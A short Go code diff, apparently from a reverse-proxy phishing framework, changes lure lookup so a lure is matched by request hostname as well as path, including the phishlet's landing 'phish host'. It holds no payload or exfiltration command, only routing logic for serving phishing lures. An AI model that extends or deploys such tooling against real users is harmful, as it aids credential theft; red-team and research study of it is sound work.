@@ -738,11 +738,16 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
-			if l.Path == path {
-				return l, nil
+			pl, err := c.GetPhishlet(site)
+			if err == nil {
+				if host == l.Hostname || host == pl.GetLandingPhishHost() {
+					if l.Path == path {
+						return l, nil
+					}
+				}
 			}
 		}
 	}
